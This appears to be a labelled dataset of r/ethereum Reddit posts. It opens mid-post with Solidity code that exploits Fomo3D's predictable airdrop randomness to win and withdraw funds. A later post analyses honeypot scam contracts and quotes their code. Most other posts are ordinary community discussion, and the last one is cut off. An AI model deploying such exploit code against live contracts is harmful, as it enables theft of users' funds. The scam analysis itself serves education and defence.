fomo3dlonginterface(0xa62142888aba8370742be823c1782d17a0389da1); if (fomo3d.airdroppot_() < 0.4 ether) { revert(); } // calculate whether this transaction would produce an airdrop. take the // ""random"" number generator from the fomo3d contract. uint256 seed = uint256(keccak256(abi.encodepacked( (block.timestamp) + (block.difficulty) + ((uint256(keccak256(abi.encodepacked(block.coinbase)))) / (now)) + (block.gaslimit) + ((uint256(keccak256(abi.encodepacked(msg.sender)))) / (now)) + (block.number) ))); uint256 tracker = fomo3d.airdroptracker_(); if((seed - ((seed / 1000) * 1000)) >= tracker) { revert(); } // ok, seems we can win the airdrop, pwn the contract address(fomo3d).call.value(0.1 ether)(); fomo3d.withdraw(); selfdestruct(msg.sender); } } i didn't get to try out my little exploit, because the attack loses 0.1 ether for every ""airdrop"" call, so the only way to make it worthwhile is to wait until the airdrop's prize is > 0.1 ether. given the 25% payout, that means airdrops need to total to > 0.4 ether. however, i saw a peculiarity that it never actually went above that value. so digging through the chain, i actually found someone who was skimming the airdoprs for 2 days now :)) [https://etherscan.io/txs?a=0x73b61a56cb93c17a1f5fb21c01cfe0fb23f132c3](https://etherscan.io/txs?a=0x73b61a56cb93c17a1f5fb21c01cfe0fb23f132c3) [https://etherscan.io/tx/0x86c3ff158b7e372e3e2aa964b2c3f0ca25c59f7bcc95a13fd72b139c0ab6f7ad](https://etherscan.io/tx/0x86c3ff158b7e372e3e2aa964b2c3f0ca25c59f7bcc95a13fd72b139c0ab6f7ad) their attack code is not really available, but looking through a successful transaction you can see that they have a more elaborate pwner code: they try to deploy a new contract, but if the address is not a winner (per the evaluation of \`airdrop()\`, they don't revert, rather keep creating nested contracts until one succeeds). gg! this attack only pwns 1% of the fomo3d contract suite as only that's the amount sent into airdrops. but to paraphrase the devs from their contracts: \*\*""lolz""\*\*. and the team's reaction: yeah, we knew our 12m contract can be broken, no biggie.

was poking around some old urls and came across this medium post (https://medium.com/@oaeee/the-rise-of-the-dark-dao-72b21a2212e3) summizing the attack and providing some links to the addresses involved. here we have the dao creator: https://etherscan.io/address/0x4a574510c7014e4ae985403536074abe582adfc8 i noticed something different between the last time i checked this link, there was a transaction 43 days ago: https://etherscan.io/tx/0xe27a1a8d16c828b0ee45f3d9addf0332a4787b957b0f31c1451ef1fc63ecdf3f now lets go to the account that sent the ether (0.05): https://etherscan.io/address/0x594ccfa066f53ea3622a120d767bf6d71714723a few days laters (38 days, 8hrs ago) there was a transaction for 0.5003eth to another address: https://etherscan.io/tx/0xd72ed111a7f32045da9c2374f2d1261ed91613dbdb26c87f06f216e5e432de27 here's the destination address for that transaction: https://etherscan.io/address/0x249a0b8a85da020d53bec45a4764998fc796ab78 few days later there is another transaction (now *this* is where things get very interesting): https://etherscan.io/tx/0x6e0e1a71f191896da818b8b19042214f6d609c8e77764f6885096b3a7990996c this is the destination address for that transaction, and you'll notice this time as opposed to waiting a few days before making another transaction, only 22 blocks are waited (this should be just enough time for the transaction to clear shouldn't it?) anyhow pay attention to the block number that the transaction is submitted at: https://etherscan.io/tx/0x013e38d14024a330f646ff1ce6a69b7eef3b8430b6dab38e188ef947b9b8731b let's go to the destination address: https://etherscan.io/address/0x08dd54f7bf39ac5f4ef9c16ec2a8156dbd5ad2bb hundreds of ethereum start flowing into that address at block 4465539, the same block number i mentioned to pay attention to from the last transaction. two more transactions are made and the pattern that is forming becomes more clear: https://etherscan.io/tx/0xc880316d1b740d76206d4e8e861b3b0d9adc1884f126fc939d73bdebc729841a https://etherscan.io/tx/0xd22af2c5ba87a2a585f68086d3b9b7c7dc14db71fef12bce438d0ad608467847 here's the two destination addresses: https://etherscan.io/address/0x3f1b9fe2cd615bbd4b57c211e1c27783f355d658 https://etherscan.io/address/0x3227b8a7335e4b309105afba2e822a0c5a68cf46 from here on out if you follow those transactions you'll notice the funds being moved across multiple addresses as soon as the funds come in. i followed a particular transaction chain for quite some time and ended up here a bittrex wallet contract: https://etherscan.io/address/0x9434092407915be059e76ba88589d464401f2589 not quite sure what to make of this so i thought i'd make a post	1
you may remember me from [2 years ago](https://www.reddit.com/r/ethereum/comments/5kr0uu/how_ethereum_will_eventually_become_the_internet/), when ethereum was selling for 7 usd and officially dead. that motivated me to submit a lengthy explanation on how it was the future of the internet, the price would eventually recover and there was nothing to worry about. turns out ethereum is officially dead again, selling at 130 usd. why? because it is boring. the ico craze is over and we're experimenting a long-lasting hangover. normal people are saturated with crypto and going on with their lives. google trends are down. nobody is here. you can hear the crickets. and that won't change any soon. but, once again, there is nothing to worry about, as long as you're patient: eventually things will change because, as i've told you before, credit cards are stupid, fiat is mortal, and ethereum has the perfect momentum to eventually become the worldwide economy; it can't die, by design. once we have new exciting stuff that makes people entertained and curious, they'll be back. meanwhile, here are some suggestions to have some fun and speed up this process. ## a book series first, we really need a good series based on crypto. i'm thinking of something like cyber wars, where people around the world realize crypto is money, and money is power, thus online factions fight over control over it all. it should be realistic and reference the real crypto history as much as possible, giving coolish explanations for things like satoshi nakamoto, mtgox, thedao incident, bitconnect and so on; there is endless source of material. i'd say a good book would aggregate more value on the field as 3.6 research breakthroughs. don't underestimate the power of literature to moving people's mind. any writer around? ## funding developers just to develop things they like developers are the most important resource we have they're the crypto equivalent of cattle in indian culture. they build the towers and castles that protect our lands from all evil. they're sacred. problem is, developers need food to survive, and that little inconvenience causes most of them to get sucked by projects that have money. and guess who has money? scammy icos. what i'm saying is that, honestly, most developers of this field, today, are working in projects that produce no real value. it is a well-known fact that the most amazing inventions of humanity came from developers on their spare times, working in things they loved. see gmail, youtube, twitter, facebook and the wheel. as such, i suggest we start a decentralized platform to give developers crypto-currencies to just develop what they like. no question asked. as long as they're building stuff, and they're enjoying it, we should give them $$$. if we can give millions to scammy icos, we can do that. i hypothesize that, as a result, mind-blowing things will be created and we'll grow at a unforeseen pace. so, let's do it! ## games we need to build games. but not games like cryptokitties which, while cool as a concept, are essentially classic games in a blockchain suit. we need games that are truly decentralized. think of a huge rpg world where people can travel around, battle, collect epic items and trade them in an emerging economy. but not only that: a game without a central developer, where people all around the world contributing with art, map, code, and a decentralized system for adopting changes. or, who know, an e-sport such as a moba like lol, or a card game like heartstone, without a central company behind its development. the good thing about games is that they're so inclusive, people love games, and it takes one good game to make a case for crypto. we need more of them! ## a government you may or may not have noticed, but governments are fueled by money. the only reason you have to pay taxes to the u.s. is that it is powerful (rich) enough to force you to. once crypto-currencies inevitably become more valuable than fiat, the power of those states will decrease. there will be anti-tax movements, people will stop respecting governments, and eventually the old power will fade away as decentralized governments emerge. that is far from happening, of course, but we can already experiment. so, i have a suggestion: let's create the decentralized state of earth! a pretend-to-be universtal state with laws, taxes and even an army. when someone asks, it is just a silly joke, and our army is actually composed by kitten. of course, secretly, we'll be building a real army of dolphins. ... that's it. thanks for listening to this old man! for those who know who i am: *shh*.	1

i believe that one way to make a successful gaming dapp on ethereum to create an in-game economy between players, which allows players to earn eth from buying and selling in-game assets/resources. there are several genres that generally develop in-game economies, some of which are rpgs, simulation games and strategy games. i've chosen to make a crypto game inspired by the popular civilization series, with some changes to fit smart contracts ie not truly turn-based but rather time-based. the slow pace of this kind of game is perfect for ethereum, which requires players to wait after every turn before they see the effects of their actions; and makes block mining time a feature rather than a hindrance because you'll be much more thoughtful about which step you'll take next, be it acquiring territory, gathering particular resources, creating and moving troops, attacking enemies, etc. in a hegaxon-grid-based world. now i'm in beta stage and looking to see if there is interest in this kind of game on ethereum. i've deployed the contracts on both the ropsten and mainnet blockchains. if you want to test the game completely free you can try the ropsten version, whereas if you already want to earn eth, you can try the mainnet version. or both. i am thinking about adding more features like federations. federations would allow players to team up diplomatically (much like guilds or alliances) for war or territory dominance purposes allowing better ether gains; and a deeper tech tree. game guide and play: https://www.civd.app/ screenshots: https://imgur.com/a/gdx8rxx tech tree: https://www.civd.app/techtree.html ropsten ether faucet: https://faucet.ropsten.be/ discord: https://discord.gg/qppucn	2
"...and was met with, ""is this from star wars?"" i had an opportunity at my company to deliver a 30 minute presentation to executive staff and the entire accounting department on a topic i think that will affect our business in the future. i decided to present an overview of the ethereum blockchain and the benefits it will have for my company and our industry. i'd like to think i'm a decent presenter, but it went terribly. not only could no one wrap their head around a global distributed ledger, but no one could see how it will be adopted. it was the worst received presentation i've ever given in my life."	1

"my apologies if this is considered somewhat off topic, but i wanted to gauge the community sentiment here about the omg project. i don't see it discussed here very much. with omg's role in developing and implementing (at least the first iteration of) plasma, and the amount of ethereum advisors in omg, the projects seem significantly linked. so what do you think about it? does it play a long term role in the scaling of ethereum? will it assume a large part of the simple value payments use case from the ethereum blockchain? do you consider omg ""part of"" ethereum? i am curious to see how omg is viewed from the perspective of the ethereum community."	1
hi guys, during past several weeks we have been working on chrome extension whose purpose is to bring ethereum to various social websites such as reddit. this is accomplished by making slight modifications to certain web pages (such as adding “tip” button to reddit posts) while having an ethereum light client integrated into the extension. in the initial release, a user can send tips to other reddit users or buy them reddit gold with eth directly. when using ξxtξnd for the first time, you will have to link your reddit account to the ethereum address that has been generated by the extension. this process uses reddit oauth, ethereum smart contract and oraclize.it service and the entire process might take 2-3 minutes. have a look at our [blog post](http://redirect.me/?https://blog.decenter.com/2017/11/14/extend/) for more details. all code has been open sourced and available for inspection on github: https://github.com/decenterapps/extend the extension can be installed either by buidling the code from github or from chrome web store directly: https://chrome.google.com/webstore/detail/extend/babconedajpngaajmlnnhpahcladpcna we are very excited to hear your feedback and improvement suggestions! :)	1

"**[note: everything in this post/thread is my own opinions and do not represent the opinions of any of my employers or companies.]** **update: i may be talking with someone from coindesk this week about my concerns to get an answer directly from them.** there has been a lot of negativity at coindesk recently. i am in a unique position of being part of both their consensus and construct 2017 conferences and wanted to share my perspective on their company, staff, and how they recently handled a situation involving [omar bham](https://twitter.com/omarbham) and his [youtube channel](https://www.youtube.com/user/obham001). ## situation with omar **tl;dr: youtuber omar live streamed content from coindesk's consensus 2017 conference and coindesk acted hostile and unprofessional in their handling of a well respected community member. now omar's youtube channel has been banned from live streaming for 3 months.** omar bham is a youtuber who discusses relevant cryptocurrency news. i met him in person recently at consensus 2017 and found him to be a very nice, enthusiastic guy. as part of his cryptocurrency channel, he posted content, including live content, from consensus 2017. omar recently released a youtube video where he discusses his exchange between himself and the head of strategy at coindesk via email and the actions coindesk took. [click here for a the full story from omar](https://www.youtube.com/watch?v=4cmsvenk2qc&t=1306s). - head of strategy at coindesk contacted omar by email to set up a call to arrange payment for licensing coindesk's content that appeared on omar's site. - omar responded that he would need to delay the call as his flight back from consensus was delayed and would be unavailable. - omar asked that they reschedule or just send him the details on the payment/licensing terms via email. - coindesk replies the next day > hi omar. since we did not connect today and you have no permission or authorization from coindesk, please remove all videos related to consensus from your website, computer, thumb drive, youtube channel, and any other soft or hard copies **immediately**. attendees are not permitted to record at the event as per our terms and conditions of attendees. please confirm that all materials have been deleted as of today. regards, [employee name]"" - omar took screenshots before the conference of any terms and conditions he could find to make sure he would not be breaking any rules before the conference. - after reading the email, omar tried to delete the videos from his channel, but found that he had a ""copyright strike"" from coindesk. because 4 of his live streamed videos were flagged for copyright violations, omar has lost the ability to live stream from his channel for 3 months. ## coindesk the company and staff the staff at coindesk are incredible. throughout multiple conferences i have gotten to know many of them. they truly care about the crypto community. there has been some backlash recently against coindesk over perceived favoritism of etc compared to eth, or downplaying eth all together. here are some things that i am sure of: - all of the writers i know, which are most of the ones who report on ethereum, are not against eth. - although coindesk is owned by digital currency group (dcg), none of the writers that i know are directly or indirectly influenced by dcg or anyone at dcg (including barry silbert). - dcg supports both eth and etc through their subsidiaries and companies they have invested in such as grayscale and etherscan. ## bottom line and what i want out of this - i want an explanation from coindesk that includes a copy of the attendee terms and conditions that they claim omar is violating. i would also like to know the licensing costs. i am currently in violation of the toc based on [this video that is still online](https://twitter.com/hudsonjameson/status/866639904326995968). so is [voice of america](http://www.voanews.com/a/blockchain-technology-goes-mainstream/3873538.html), [ripple](https://www.youtube.com/watch?v=al2dls3pje0), [civic](https://www.youtube.com/watch?v=3lulnvykkso), and dozens more companies (unless of course they have paid a licensing fee). update: [see this comment below for what may be the toc. i did not see this link when signing up via their bizzabo system and the link provided is given for 2018 consensus attendees (although the pdf lists 2017): https://np.reddit.com/r/ethereum/comments/6dw4n4/why_i_cant_defend_coindesk_any_longer_take_action/di5v662 ## what you can do - [unsubscribe from coindesk's twitter](https://twitter.com/coindesk). - [tweet at coindesk and demand an explanation](https://twitter.com/coindesk). - if anyone from coindesk is reading this and is disgruntled leave the company. i know a few of you already have or are in the process of it. you don't have to make a fuss about it or trash them on the way out. just leave and create a less corporate and more community oriented coin news media site (like what coindesk used to be). we would support you. i have defended coindesk for months based on my very positive relationships with the writers and staff. i can't defend coindesk as a whole anymore because even if the majority of those who i interact with have good intentions, something has shifted at a company level and they seem to value corporate interests over the little guys. they no longer represent the best interests of our community."	1
seriously, i dont understand. when you have funding problems there is surely a better way. i can only speak for myself that i was very excited about your project being a candidate for a key component of the ethereum infrastructure. i really do not understand why one needs a specific token. you are risking your integrity for a fast cash grab. could you please specify why an ico or a token is inevitable for raiden? why cant you just use ether?	0
hey r/ethereum! so i've been hodl-ing for a long time, and i've recently gotten into solidity development. shit's dope. the long and short of this project is that i got sick and tired of people telling me that the bullish cryptocurrency market we're in was analogous the the 1600's tulip mania. so to make fun of these people i created [cryptulips.co](https://cryptulips.co). which is basically cryptokitties, **but with tulips**. allowing people to trade, grow, breed, and sell unique digital tulips that live forever on the blockchain. if you signup i'll keep you in the loop on the development (when it's on ropsten, main network, etc) and give you first crack at gen0 tulips. i just [posted this the other day](https://www.reddit.com/r/ethtrader/comments/7l4ayt/tulip_mania_in_crypto_is_bullshit_so_i_made/) on r/ethtrader and it went crazy! cryptulips is primarily a joke, but i hope it'll be a fun learning experience and that it will ruffle the feathers of some of the old economic guard. if you think it's funny, or interesting please holler at me and sign up! tl;dr i'm making cryptokitties for tulips to make fun of naysayers **edit** checkout r/cryptulips twitter: [@cryptulips](https://twitter.com/cryptulips)	1
germanys biggest bitcoin marketplace, bitcoin.de, will add ethereum trading soon. this is good news, as it will be the first regulatory compliant ethereum-fiat exchange made in germany for germany. many users already can trade in a beta phase. works flawlessly. if you think: this is boring news, there are so many ethereum exchanges out there, keep in mind: the latest regulatory interventions in china show that stable and compliant markets places are urgently needed - especially those that meet local legal requirements.	1
hey all! i'm the guy who put together and demonstrated [toastycoin and burnable payments](http://www.toastycoin.com). after toastycoin, i scratched my head a lot over how to scale up the research and development of more cryptoeconomic primitives. **this has lead me to start a free, virtual academy, focused on the rapid development of smart contracts and their interfaces.** seminars start next monday, and a schedule will be announced later this week. seminars will be archived publicly. no enrollment process--just tune in live (and ask questions!) or watch the archives. ## cpa: the cryptoprimitive academy [cpa](http://cpacademy.io) is a non-profit, non-coin enterprise founded on two major premises: 1. there is a large, untapped pool of talented developers, who would be happy to help build the dapp ecosystem--if only they had a reliable source of personalized guidance for determining not only **how to build dapps**, but more fundamentally, **what to build and why.** 2. a subset of dapps, known as **cryptoeconomic primitives**, will likely be the bedrock upon which larger ethereum applications are built. but because cryptoeconomic primitives are (by definition) non-proprietary, they don't return profit or increase coin value--so research and development into this field is lacking. addressing this lack would directly increase the utility of ethereum to developers, thereby indirectly doing the same for users. cpa will bring these two dynamics together first by designing and developing cryptoeconomic primitives live via the seminars, but also by viewing work on cryptoeconomic primitives as a kind of opt-in coursework. students who choose to engage in this coursework can apply for cpa accreditation, which will be granted if they've made substantial progress on the cryptoeconomic primitive in question, without significant outside guidance. we expect to cultivate a welcoming community made up of students of varying skillsets, which both educates its members and produces cryptoeconomic primitives that directly increase ethereum's utility. ### office hours starting next monday, i'll be online and available, minus occasional lunch/coffee breaks, between **utc weekdays 17:00 and 01:00.** during this time, i'll be available on the cryptoprimitive slack ([invite here](https://cp-slack-invite.herokuapp.com/)) to answer any questions related to the coursework. ### pre-reqs we will assume all students are comfortable with oop and can understand simple js and/or python code. anyone can join the seminars, of course, but we may ignore questions that seem to come from ignorance in these areas. ### seminars seminars will start next week on monday, and occur on a regular weekly schedule. this schedule will be determined after reviewing the comments from this post, but remember that all seminars will be archived and publicly available. most seminars will consist of me simply livestreaming the design and development of a cryptoeconomic primitive from the ground up, verbalizing my thought process, and doing my best to answer any questions in the chat. some questions will be answered more fully in a blog post at the end of each week. the first two seminars will be livestreamed development of an extremely basic dapp, and will serve as a tour around some of the tools used. the first seminar will focus on building the contract itself (solidity), and the second will focus on the interface (js and/or python). subsequent seminars will focus on implementing specific cryptoeconomic primitives, continuing in the style of livestreamed development with q&a. when deciding on the next project to tackle during the seminars, i'll be taking student interest heavily into account. the exact schedule and subjects of the first set of seminars will be determined later this week and sent out to the mailing list. sign up for that [here](https://visitor.r20.constantcontact.com/d.jsp?llr=cfjazc6ab&p=oi&m=1130743473314&sit=ke8rgopmb&f=30cfc2bd-aba1-4875-b771-77dd294e1eaa). ### coursework coursework is optional, unless one wants to become accredited. all coursework will focus on cryptoeconomic primitives: non-proprietary, simple tools or apps that are immediately practical (whether stand-alone or as a building block for larger systems). by the time seminars start on monday, we will have provided a list of cryptoeconomic primitive tasks and projects. cpa will provide direct guidance to any student capable of pushing any of these tasks or projects forward in meaningful ways. we expect this list to grow quickly, as the field of crytpoeconomic primitives seems rich and largely unexplored, and initial progress will lead to more advanced study. ### accreditation one of the first contracts we will develop in the seminars is an accreditation contract. the logic will be very simple, as will the application process. to become accredited, one must independently make significant progress on a pre-approved cryptoeconomic primitive. more details on the accreditation process and policy will be announced next week. ### interested? - if you'd like a chance to attend the seminars live, respond to my comment below asking for seminar timing preferences. we'll aim for a schedule that allows as many people as possible to attend some of the seminars. - [sign up for the mailing list](https://visitor.r20.constantcontact.com/d.jsp?llr=cfjazc6ab&p=oi&m=1130743473314&sit=ke8rgopmb&f=30cfc2bd-aba1-4875-b771-77dd294e1eaa), and expect to see a schedule with seminar titles and details mailed out later this week! - feel free to check out our slack ([invite here](https://cp-slack-invite.herokuapp.com/)) to say hi or get a peek at the kinds of projects we'll focus on! - keep an eye on [the website](http://cpacademy.io), which will be built up over the next few days.	1
"let's take a moment to reflect on just how awesome taylor, kvhnuke, and the mew team are. their humble web wallet has quietly become an indispensable fixture of the ethereum ecosystem. mist not syncing? mew. ledger's chrome app not showing all your deterministic addresses? mew. need a quick-and-dirty spare change wallet? mew. replay protection after the dao fork? mew. did they require an ico funding a ""first of its class, muti-functional web wallet"" accompanied by a flashy white paper? no. do they even charge for their services? no. do they provide support for questions about ens even though they aren't officially part of the project. yes. has taylor walked countless panicked people through the process of accessing their lost eth? yes, i suspect she has. i've been in this space since almost the beginning, and can't think of any other projects that have added more value, utility, and functionality to the ethereum world. and on top of that, team mew is super-chill. keep up the awesome work /u/insomniasexx , /u/kvhnuke, and everyone else working on the service. it's people like you that set ethereum apart from other crypto communities. oh, i'd be remiss if i didn't remind everyone that mew has a tip jar. eth: 0x7cb57b5a97eabe94205c07890be4c1ad31e486a8 btc: 1mewt2sgbqtz6mpcgfcnea8xmwv5z4wc6"	1
"hey all, we've been using google ads for the past 6 months to help us get more visibility for our smart contract auditing services and we've noticed a strange change in the last few days. it seems that google completely blacklisted ethereum as a keyword. any of the keywords that contain ""ethereum"" in our campaigns are no longer showing ads as of january 9th and are now reporting the following error: >an ad isn't showing now > >this candidate is not permitted to show ads in your targeted location. here's [a screenshot](https://imgur.com/a/fwypzex) of the mentioned error. we also tried [communicating with google](https://twitter.com/decenterteam/status/1083392362544594944), but to no avail. although the google ads team claims there have been no changes to their policies, you can try searches such as ""ethereum smart contract audits"" and ""eos smart contract audits"" - only the latter will show ads in results. we could not find any news about recent policy updates anywhere. the keyphrases such as ""ethereum security audits"" were simply getting impressions until january 8th and then suddenly stopped, showing only this very ambiguous error as the explanation. what's interesting is that the blacklist doesn't apply to the keywords such as ""ico"", ""bitcoin"", ""eos"" etc. we also tried vpning to multiple different countries and it seems that no ads with ""ethereum"" in the search term are showing up anywhere. is anyone else seeing the same thing and do they have an idea as to why? we are concerned that google is targeting ethereum specifically for some reason and wanted to see if we as a community could put some pressure on the google ads team to adjust their keyword policy or to at least provide a reasonable explanation for such discriminatory regulations."	1

hey everyone, we just put out a news release regarding our first satellite launch. i would like to share it with you. it's amazing what ethereum has pulled off as a community. it's truly special and the collection of people (cryptographers, artists, dreamers and creators). as an ode to what the community has built, i wanted to make sure we named the first satellite that xyo launches after ethereum! i'm heading to ethdenver with my team this year and look forward to catching up with everyone i met from last year! from the press release, here's the part i'm most proud of! >*for phase two, xyo network will launch its own custom satellite with spaceflight aboard a spacex falcon 9 in late 2019, on spacex crs-19. xyo will send its first satellite, named the “etherx,” into orbit, in a nod to the “ethereum” blockchain platform.* > >*xyo network co-founder scott scheper commented: “speaking personally, ethereum inspired me to go from a long-time blockchain observer to going ‘all in’. my work is now 100 percent focused on blockchain technologies. what the ethereum developer community and vitalik buterin have built, has moved the entire ecosystem forward, period. as an ode to ethereum and vitalik, we decided to name our first satellite the ‘etherx.’”* > >*the etherx is only the first of xyo network’s fleet of satellites. the company intends to launch a fleet of satellites named after important cryptographers and individuals who inspired them. in fact, xyo network plans on enabling their global community of “geohackers” to fully participate by purchasing a ‘stake’ in each satellite.* here's the [link to the press release](https://www.businesswire.com/news/home/20181211005375/en/). &#x200b;	1
"i've noticed a plethora of scam/honeypot contracts being published on etherscan. i've also been wanting to contribute to the ethereum community more and so i thought this would be a perfect opportunity to do a little write up that would go over the details of some of these contracts. there will be a bit of code in this post, though nothing too complex. hopefully this will serve as an educational piece, but bear with me as i don't often write posts. ### dividend distributor https://etherscan.io/address/0x858c9eaf3ace37d2bedb4a1eb6b8805ffe801bba#code this smart contract takes advantage of a solidity compiler bug detailed here: https://etherscan.io/solcbuginfo?a=skipemptystringliteral. this bug results in skipping the empty string literal `""""` when passed in as a function argument. here's the code for the function of interest: function divest(uint amount) public { if ( investors[msg.sender].investment == 0 || amount == 0) throw; // no need to test, this will throw if amount > investment investors[msg.sender].investment -= amount; suminvested -= amount; this.loggedtransfer(amount, """", msg.sender, owner); } any investor trying to divest will be in for a rude awakening when their ether is transferred to the owner's address. the bug results in this line of code `this.loggedtransfer(amount, """", msg.sender, owner)` being translated to `this.loggedtransfer(amount, msg.sender, owner)` and so the owner is the true recipient. ### private bank https://etherscan.io/address/0xb5e1b1ee15c6fa0e48fce100125569d430f1bd12#code this contract makes use of the same bug found in the infamous dao hack. here's the code of interest: if(msg.sender.call.value(_am)()) { balances[msg.sender] -= _am; transferlog.addmessage(msg.sender, _am, ""cashout""); } for anyone not familiar with the interworkings of the dao hack, the line `msg.sender.call.value` sends the remaining gas with the `call` function, whereas `msg.sender.send(value)` only sends a fixed stipend of 2300 gas. normally, `msg.sender` would be a typical wallet address, but in the case where it is a smart contract address the fallback function is invoked. the key here is that the ether being sent is not subtracted from the balance until *after* it is sent. if it was subtracted before, this recursive attack would not work. so all the fallback function has to do is call the `withdraw` function and add in logic to make sure it doesn't take more ether than the contract holds. so what's wrong here? the answer lies in the `transferlog.addmessage` call. you may have noticed that the log contract source was posted to etherscan, only that wasn't the real source code. notice how the contstructor of privatebank sets the address of the real log contract. all the creator of this contract had to do was make sure that the real log contract had a function with the same signature as the `addmessage` function posted. the real source code probably looks something like: function addmessage(address _sender, uint256 _amount, string _message) { // note that this is not valid solidity require(_sender == owner || _message == ""deposit""); // and so on ... } this translates to: if the sender isn't me or someone isn't depositing ether then fail, which will revert all state changes, thus never allowing you to withdraw your ether. ### open address lottery https://etherscan.io/address/0xd1915a2bcc4b77794d64c4e483e43444193373fa#code this contract scams participants by masquerading as a legitimate lottery, but of course it's not. the malicious code is disguised by a subtle solidity quirk. take a look at this function: function forcereseed() { //reseed initiated by the owner - for testing purposes require(msg.sender==owner); seedcomponents s; s.component1 = uint(msg.sender); s.component2 = uint256(block.blockhash(block.number - 1)); s.component3 = block.difficulty*(uint)(block.coinbase); s.component4 = tx.gasprice * 7; reseed(s); //reseed } you'll notice that an instance of the struct seedcomponent is created. most programmers, familiar with other popular programming languages, would assume that s is a local instance of the seedcomponent struct ie. it goes on the runtime stack. however, in solidity any *complex* data type is implicitly a storage pointer unless otherwise specified. this results in component1 pointing to index 0, component2 pointing to index 1, and so forth. the `luckynumber` variable lives at index 3 and is assigned the value of `tx.gasprice * 7`. this makes it impossible to win, as the winner is selected via a function that looks like `notsorandomnumber % 2`. here the owner calls the `forcereseed` function: https://etherscan.io/tx/0xf554329a9b949b408d9c75614261ae48d38c818a3f4df970cfeef7f48c2238c4 and here's documentation outlining this quirk (it's pretty easy to gloss over it): http://solidity.readthedocs.io/en/develop/types.html ### new years gift https://etherscan.io/address/0x13c547ff0888a0a876e6f1304eaefe9e6e06fc4b#code this contract takes advantage of a small flaw in a third party resource that many of us use, etherscan. the flaw being that etherscan doesn't show contract a calling functions from contract b as a transaction under contracts b's history, making it easy to obfuscate function calls. basically, this contract works by allowing the user to set the `hashpass` only if `passhasbeenset` is false. anyone who knows the input that produced the value of `hashpass` can claim the funds of this contract by calling `getgift`. of course, the storage variable `passhasbeenset` is private and therefore not readable via etherscan. luckily, we can use web3 and check the value of the variable ourselves: > web3.eth.getstorageat(""0x13c547ff0888a0a876e6f1304eaefe9e6e06fc4b"", 1) < ""0x00000000000000000000008ca354f7e84881157bdbc36d8c40d5b5077621b601"" note that `sender` and `passhasbeenset` belong to the same storage slot since addresses take up 20 bytes and booleans take up 1 byte (storage slots are 32 bytes). therefore the last two characters belong to `passhasbeenset`, which has a value of 01 -> true. on a side note, i've contacted etherscan about this issue and i imagine they will fix this at some point - which reminds me; a friend of mine recently contacted etherscan about another *flaw* where the contract source code wasn't being wrapped. someone posted a very similar honeypot to this one where there was code being prefixed by a ridiculous number of spaces resulting in the code being rendered off screen (unless you happened to see the tiny horizontal scrollbar and scrolled over). etherscan has since fixed this issue, in a timely matter too. ### summary if anything, i hope this has been an entertaining read. if you have any questions regarding the content of this post or questions about solidity in general, ask away; i'll do my best to answer. edit: formatting - i thought reddit allowed three backticks for code blocks ... til. edit2: clarity/grammar thanks for the gold kind person :)"	1
to prove the smartbillions lottery smart contract comprehensive security, the development team has placed 1500 eth in the smart contract address the 1500 eth hackaton prize has been sent to the smart contract address: https://etherscan.io/address/0x5ace17f87c7391e5792a7683069a8025b83bbd85 the prize awaits hacker who will be able to find a way to break into the smart contract and withdraw the stored funds. as we can see, the smartbillions team was very serious about guaranteeing investors’ protection. this is the first time in a history, that hackaton is held to prove the self-amending, smart contract quality and security. the development team is so sure about their product and its security, that they will risk their own - significant funds (1500 eth), to prove its safety. the success of hackaton will prove the smart contract’s stability and security. it will also indisputably guarantee, that the investors’ funds will be well protected. if the funds remain intact, the smartbillions ico will start on october 16th. https://smartbillions.com/ new hackathon https://www.reddit.com/r/ethereum/comments/74ttso/smartbillions_announced_their_second_hackathon/	2
**what have we done** after very extensive and detailed research in conjunction with blockproof tech llc, dao.casino is announcing that it has found the future of the gambling industry. in what it is terming gambling 3.0, dao.casino has found a way to increase interaction speed between dapps’ players, without losing any gas costs or security. the study has successfully shown that the generating of a new block approximately every 15 seconds and every transaction taking an average of six minutes can be reduced. this is because game channels will run on top of existing blockchains. **abstract** blockchain technology has immense potential. at the same time, it is not always possible to scale blockchains. state channels solve the problem of scalability while increasing the blockchain's speed and efficiency. state channels present a workaround to current blockchains' tps (transaction per second) bottleneck. we used state channels as a foundation and created game channels. we built it around the needs of the gambling market. we also developed signidice prng as well as a dispute resolution mechanism. signidice uses unique digital signatures and is also described below. the potential use of game channels technology is not only gambling; some types of online gaming may also be able to use it. read more about our research on ethresear.ch: [https://ethresear.ch/t/game-channels-state-channels-for-the-gambling-industry-with-built-in-prng/4341](https://ethresear.ch/t/game-channels-state-channels-for-the-gambling-industry-with-built-in-prng/4341) link to the paper describing the study: [https://dao.casino/rnd/gamechannels.pdf](https://dao.casino/rnd/gamechannels.pdf)	1

the big drop in usd value of eth has made a lot of you very critical toward ethereum and its development. the truth is that behind the scene some incredible things are happening and paving the way for ethereum to become the operating system of the world but some of you can't see that so i'll try to explain my vision: # ethereum is starting to replace banks by allowing users to receive loans from the blockchain i recently used for the first time makerdao’s cdp system that lets you « loan yourself » a certain amount of dai (= 1 usd) according to the amount of eth you are willing to use as a collateral. for the first time in modern finance we are able to loan ourselves money based on our assets at an interesting rate (2.5%) without having to use a central entity like a bank. basically you receive your eth back when you return the dai loaned and if the value of eth climbs you might never have to reimburse the dai loaned. this has huge implications and it also means that ethereum users can receive money from holding their eth without having to sell it. they can also leverage their eth position by acquiring more eth with the dai received from the loan and lock it again in the cdp to decrease the risk of reaching the liquidation price. # incentives to hold dais (an ethereum based usd) will create a wave of new money joining the ethereum network this is a game changer. maker recently announced the [dai saving rate system](https://medium.com/makerdao/dai-reward-rate-earn-a-reward-from-holding-dai-10a07f52f3cf) allowing dai owners to lock their dai in a dsr contract and receive a 2% annual interest in return without having to pay any fees. in my country, the interest on the money i have in my bank account is around 0.7% which means that people will soon have greater incentives to turn their savings into dai and lock it in a dsr rather than keeping it in their bank account. this has huge implications for the ethereum blockchain has it could trigger a massive amount of new money joining the ethereum blockchain to benefit from this annual interest. i’ve always seen crypto debit cards like monaco (now crypto.com), wirex or tenx as a bad thing for the market since it simply meant selling your crypto at market rate to use fiat to pay for things. but i now see them as a great bridge between the crypto and fiat system as it could give us the opportunity to simply spend our dais received by a cdp loan or by the interest from the dai saving rate system. # plasma is coming omisego has been very quietly moving forward with plasma development (they released their first test net during devcon) and its global dex integrating fiat gateway will arrive at some point and make the transition between fiat and crypto much more straightforward. # some other projects that i like millions of people are using the brave browser and will be at some point exposed to bat (an ethereum token). 3d artists are using the ethereum blockchain through golem to render 3d designs. dydx lets you do margin trading in a fully decentralized way by purchasing some long or short tokens, i just acquired some leveraged tokens on [expo](https://expotrading.com/trade) (based on dydx) and 